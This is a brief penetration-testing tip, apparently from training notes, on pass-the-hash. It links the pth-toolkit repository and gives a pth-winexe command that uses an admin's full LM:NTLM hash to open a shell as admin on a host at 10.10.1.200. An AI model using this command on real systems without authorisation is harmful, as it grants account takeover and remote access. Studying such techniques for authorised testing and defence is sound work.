
https://github.com/byt3bl33d3r/pth-toolkit.git

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

`pth-winexe -U 'admin%hash' //10.10.1.200 cmd.exe`